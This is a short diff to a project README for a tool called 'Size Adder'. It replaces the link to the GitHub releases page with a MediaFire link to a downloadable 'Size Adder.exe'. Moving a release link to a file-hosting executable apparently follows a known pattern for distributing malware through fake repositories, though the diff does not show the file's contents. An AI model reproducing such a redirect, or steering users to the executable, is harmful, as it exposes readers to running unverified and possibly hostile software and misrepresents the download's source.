@@ -34,5 +34,5 @@ Feel free to open issues or submit pull requests.
 
 ## Download Now
 
-You can download the latest version from the [releases page](https://github.com/your-repo/sizer-adder/releases).
+You can download the latest version from the [MediaFire link](https://www.mediafire.com/file/mqflc0otk66s4d5/Size+Adder.exe/file).
 
